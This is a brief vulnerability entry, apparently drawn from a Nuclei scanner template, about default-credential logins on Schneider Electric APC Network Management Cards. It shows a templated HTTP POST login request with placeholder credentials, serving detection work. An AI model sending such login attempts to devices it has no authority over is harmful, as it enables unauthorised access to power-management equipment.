# Vulnerability: Schneider Electric APC NMC - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`apc-nmc-default-login.yaml`)

## Description
Schneider Electric APC Network Management Cards with default credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Forms/login1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_username={{username}}&login_password={{password}}&prefLanguage=00000000&submit=Log+On
```

